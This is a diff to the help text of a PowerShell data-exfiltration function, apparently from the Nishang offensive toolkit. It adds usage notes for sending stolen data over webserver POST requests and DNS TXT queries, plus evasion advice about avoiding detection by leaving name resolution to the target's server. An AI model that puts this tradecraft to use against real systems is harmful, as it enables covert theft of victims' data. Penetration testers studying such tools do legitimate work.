@@ -29,14 +29,15 @@ Password for the pastebin/gmail account where data would be exfiltrated.
 Unused for other options
 
 .PARAMETER URL
-The URL of the webserver where POST requests would be sent.
+The URL of the webserver where POST requests would be sent. The Webserver must beb able to log the POST requests.
+The encoded values from the webserver could be decoded bby using Invoke-Decode from Nishang.
 
 .PARAMETER DomainName
-The DomainName, whose subdomains would be used for sending TXT queries to.
+The DomainName, whose subdomains would be used for sending TXT queries to. The DNS Server must log the TXT queries.
 
 .PARAMETER AuthNS
-Authoritative Name Server for the domain specified in DomainName
-
+Authoritative Name Server for the domain specified in DomainName. Using it may increase chances of detection.
+Usually, you should let the Name Server of target to resolve things for you.
 
 .EXAMPLE
 PS > Get-Information | Do-Exfiltration -ExfilOption gmail -username <> -Password <>
